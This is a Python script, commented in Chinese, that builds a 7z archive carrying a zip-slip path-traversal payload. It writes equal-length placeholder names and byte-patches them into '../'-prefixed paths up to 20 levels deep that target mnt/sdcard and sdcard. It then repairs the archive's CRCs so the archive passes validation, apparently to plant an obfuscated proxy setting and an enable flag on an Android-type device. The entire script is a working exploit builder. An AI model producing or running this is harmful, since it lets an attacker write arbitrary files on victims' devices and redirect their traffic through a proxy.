# -*- coding: utf-8 -*-
"""build_slip_compat.py - 最大兼容 ZIP-SLIP 载荷:
   · -mx=0 (Copy 不压缩) + -ms=off (非固实) => 老版 7z SDK 100% 兼容
   · 深度 1..20 全覆盖 + /mnt/sdcard 与 /sdcard 双前缀
   · 仍用"等长占位名 + 字节替换 + 修 CRC"的老办法
"""
import io
import os
import struct
import subprocess
import zlib

SZ = r'C:\Program Files\7-Zip\7z.exe'
W = r'C:\p200build\7zslip_compat'
os.makedirs(W, exist_ok=True)
MARK = "P200-XHPROXY\n"

DIGITS = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
KEYS = ["Q", "W", "E", "R", "A", "S", "D", "F", "Z", "X"]


def encrypt_proxy(p):
    out = []
    for ch in p:
        if ch == '.':
            out.append('O')
        elif ch == ':':
            out.append('P')
        elif ch.isdigit():
            out.append(KEYS[DIGITS.index(ch)])
        else:
            out.append(ch)
    return "".join(out)


PROXY = "192.168.137.1:18080"
ENC = encrypt_proxy(PROXY)
print("[0] 代理 %s -> 文件名 %s" % (PROXY, ENC))

TARGETS = []
for n in range(1, 21):
    TARGETS.append(("../" * n) + "mnt/sdcard/xhproxy/" + ENC)
    TARGETS.append(("../" * n) + "sdcard/xhproxy/" + ENC)
TARGETS.append(("../" * 4) + "mnt/sdcard/xhproxy_on.txt")
TARGETS.append(("../" * 6) + "sdcard/xhproxy_on.txt")

# 去重 + 等长占位名
pairs = []
used = set()
for idx, t in enumerate(TARGETS):
    if t in used:
        continue
    used.add(t)
    L = len(t)
    tail = "%04d" % idx
    orig = ("z" * (L - 8)) + tail + ".dat"
    assert len(orig) == L, (len(orig), L)
    pairs.append((orig, t))

arc = os.path.join(W, "compat.7z")
if os.path.exists(arc):
    os.remove(arc)
srcs = []
for orig, _ in pairs:
    fp = os.path.join(W, orig)
    io.open(fp, 'w', encoding='ascii').write(MARK)
    srcs.append(fp)

print("[1] 占位样本 %d 个, 名字长度 %d 种" % (len(srcs), len(set(len(o) for o, _ in pairs))))
r = subprocess.run([SZ, 'a', '-mhc=off', '-t7z', '-mx=0', '-ms=off', arc] + srcs,
                   capture_output=True, text=True)
print("[2] 7z a rc=%d" % r.returncode)
if r.returncode != 0:
    print("    %s" % (r.stderr or '')[:300])
    raise SystemExit(1)

data = bytearray(io.open(arc, 'rb').read())
patched = 0
for orig, tgt in pairs:
    o16 = orig.encode('utf-16-le')
    t16 = tgt.encode('utf-16-le')
    p = data.find(o16)
    if p >= 0:
        data[p:p + len(o16)] = t16
        patched += 1
print("[3] 名字替换 %d / %d 条" % (patched, len(pairs)))

(shcrc,) = struct.unpack_from('<I', data, 8)
(nh_off,) = struct.unpack_from('<Q', data, 12)
(nh_size,) = struct.unpack_from('<Q', data, 20)
nh_start = 32 + nh_off
nh = bytes(data[nh_start:nh_start + nh_size])
struct.pack_into('<I', data, 28, zlib.crc32(nh) & 0xFFFFFFFF)
struct.pack_into('<I', data, 8, zlib.crc32(bytes(data[12:32])) & 0xFFFFFFFF)
print("[4] CRC 已修正")

out = os.path.join(W, "compat_fixed.7z")
io.open(out, 'wb').write(bytes(data))
print("[5] 输出 %s (%dB)" % (out, os.path.getsize(out)))

r2 = subprocess.run([SZ, 't', out], capture_output=True, text=True)
print("[6] 7z t rc=%d  %s" % (r2.returncode, (r2.stdout or '').strip().splitlines()[-1] if r2.stdout else ''))
r3 = subprocess.run([SZ, 'l', '-slt', out], capture_output=True, text=True)
for line in (r3.stdout or '').splitlines()[:40]:
    if line.startswith('Method') or line.startswith('Solid') or line.startswith('Path = ..'):
        print("    " + line)
